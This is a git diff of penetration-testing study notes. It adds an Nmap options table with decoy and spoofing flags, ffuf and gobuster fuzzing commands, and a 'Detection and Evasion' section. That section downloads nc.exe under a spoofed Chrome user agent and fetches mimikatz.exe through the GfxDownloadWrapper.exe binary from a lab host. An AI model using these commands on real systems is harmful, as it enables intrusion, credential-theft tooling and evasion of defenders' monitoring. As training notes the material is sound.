@@ -1,13 +1,12 @@
 ---
 # Penetration Testing Notes
 ---
-<p align="center">
-  <img src="https://github.com/carnifex17/Cybersecurity-Notes/blob/main/images/hacking-is-our-weapon.jpg">
-</p>
+
+![image info](./images/hacking-is-our-weapon.jpg)
 
 # Table of Contents
 ---
-- [FOOTPRINTING](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#footprinting)
+- [RECONNAISSANCE](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#reconnaissance)
 - [Domain Information](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#domain-information)
 - [PROTOCOLS](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#protocols)
 	- [FTP](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#ftp)
@@ -37,16 +36,21 @@
 	
 	
 ---
-# Footprinting
+
+
+
+
+
+# Reconnaissance
 ---
-### Our goal is not to get at the systems but to find all the ways to get there.
+### Our goal is not to get at the systems but to find all the ways to get there. 
 ---
 **To do proper reconnnaissance we should use three principles:**
 1. There is more than meets the eye. Consider all points of view.
 2. Distinguish between what we see and what we do not see.
 3. There are always ways to gain more information. Understand the target.
 ### Methodology
-This methodology is nested in 6 layers and represents, metaphorically speaking, boundaries that we try to pass with the enumeration process. The whole enumeration process is divided into three different levels:
+This methodology of footprinting is nested in 6 layers and represents, metaphorically speaking, boundaries that we try to pass with the enumeration process. The whole enumeration process is divided into three different levels:
 - Infrastructure-based enumeration
 - Host-based enumeration
 - OS-based enumeration
@@ -90,6 +94,98 @@ The other part we could gather info about is DNS Records by using as example
 ```bash
 dig any inlanefreight.com
 ```
+## Nmap
+
+<!-- Cheetsheet from HTB Academy  -->
+
+| Option | Description |
+| ------ | ----------- |
+| 10.10.10.0/24 | Target network range. |
+| -sn | Disables port scanning. |
+| -Pn | Disables ICMP Echo Requests. |
+| -n | Disables DNS Resolution. |
+| -PE | Performs the ping scan using ICMP Echo Requests against the target. |
+| --packet-trace | Shows all packets sent and received. |
+| --reason | Displays the reason for a specific result. |
+| --disable-arp-ping | Disables ARP Ping Requests. |
+| --top-ports=\<num> | Scans the specified top ports defined as most frequent. |
+| -p- | Scan all ports. |
+| -p22-110 | Scan all ports between 22 and 110. |
+| -p22,25 | Scans only the specified ports 22 and 25. |
+| -F | Scans top 100 ports. |
+| -sS | Performs a TCP SYN-Scan. |
+| -sA | Performs a TCP ACK-Scan. |
+| -sU | Performs a UDP Scan. |
+| -sV | Scans the discovered services for their versions. |
+| -sC | Perform a Script Scan with scripts categorized as "default". |
+| --script=\<script> | Performs a Script Scan using the specified scripts. |
+| -O | Performs an OS Detection Scan to determine the OS of the target. |
+| -A | Performs OS Detection, Service Detection, and traceroute scans. |
+| -D RND:5 | Sets the number of random Decoys used to scan the target. |
+| -e | Specifies the network interface used for the scan. |
+| -S 10.10.10.200 | Specifies the source IP address for the scan. |
+| -g | Specifies the source port for the scan. |
+| --dns-server \<ns> | DNS resolution is performed using a specified name server. |
+
+### Output Options
+
+| Option | Description |
+| ------ | ----------- |
+| -oA filename | Stores the results in all available formats starting with the name "filename". |
+| -oN filename | Stores the results in normal format with the name "filename". |
+| -oG filename | Stores the results in "grepable" format with the name "filename". |
+| -oX filename | Stores the results in XML format with the name "filename". |
+
+### Performance Options
+
+| Option | Description |
+| ------ | ----------- |
+| --max-retries \<num> | Sets the number of retries for scans of specific ports. |
+| --stats-every=5s | Displays the scan's status every 5 seconds. |
+| -v/-vv | Displays verbose output during the scan. |
+| --initial-rtt-timeout 50ms | Sets the specified time value as the initial RTT timeout. |
+| --max-rtt-timeout 100ms | Sets the specified time value as the maximum RTT timeout. |
+| --min-rate 300 | Sets the number of packets that will be sent simultaneously. |
+| -T <0-5> | Specifies the specific timing template. |
+
+## Subdomain enumeration
+- **Gobuster DNS**
+```bash
+gobuster dns -d superkek.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 20
+```
+
+## Fuzzing
+### Ffuf
+| **Command**   | **Description**   |
+| --------------|-------------------|
+| `ffuf -h` | ffuf help |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ` | Directory Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ` | Extension Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php` | Page Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v` | Recursive Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/` | Sub-domain Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx` | VHost Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx` | Parameter Fuzzing - GET |
+| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Parameter Fuzzing - POST |
+| `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Value Fuzzing |  
+
+### Wordlists
+
+| **Command**   | **Description**   |
+| --------------|-------------------|
+| `/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` | Directory/Page Wordlist |
+| `/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt` | Extensions Wordlist |
+| `/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` | Domain Wordlist |
+| `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt` | Parameters Wordlist |
+
+### Misc
+
+| **Command**   | **Description**   |
+| --------------|-------------------|
+| `sudo sh -c 'echo "SERVER_IP  academy.htb" >> /etc/hosts'` | Add DNS entry |
+| `for i in $(seq 1 1000); do echo $i >> ids.txt; done` | Create Sequence Wordlist |
+| `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'` | curl w/ POST |
+
 ---
 # Protocols
 ---
@@ -1148,22 +1244,6 @@ r = requests.post(url,files={"files":file})
 ```
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ### PHP
 1. **PHP Download with File_get_contents()**
 ```bash
@@ -1288,4 +1368,25 @@ PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:
 4. **Copy DATABASE.txt from DATABASE01 Session to our Localhost**
 ```powershell
 PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+# Detection and Evasion
+## File Transfer Detection
+**A lot of SIEM (Security Information and Event Management) are  checking `user-agents` to detect sus traffic.** But `user-agents` are not inly used to identify web browsers, but anything acting as HTTP client and connecting to a web server via HTTP can have user agent string(like `cURL`, custom `Python` script or common tools like `sqlmap` and `nmap`). So File transfers could be detected. 
+### Evasion Techniques
+#### Changing User Agent:
+1. **Listing out User Agents**
+```powershell
+PS C:\carnifex17>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+```
+2. **Request with Chrome User Agent**
+```powershell
+PS C:\carnifex17> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+PS C:\carnifex17> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+#### LOLBAS / GTFOBins
+Application whitelisting may prevent you from using PowerShell or Netcat, but not from using `Living Off the Land` Binaries. As example LOLBIN is the Intel Graphics Driver for Windows 10(GfxDownloadWrapper.exe), which could be used to file transfer
+1. **Transferring File with GfxDownloadWrapper.exe**
+```powershell
+PS C:\carnifex17> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
 ```
